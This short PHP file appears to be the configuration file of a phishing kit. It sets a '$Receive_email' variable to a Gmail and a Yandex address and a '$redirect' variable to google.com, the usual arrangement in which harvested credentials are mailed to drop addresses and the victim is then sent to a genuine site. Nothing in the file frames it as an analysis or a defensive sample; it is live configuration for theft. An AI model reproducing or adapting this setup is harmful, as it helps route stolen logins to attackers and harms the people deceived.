<?php 
$Receive_email="urban27works@gmail.com, numbinc27@yandex.ru";
$redirect="https://www.google.com/";
?>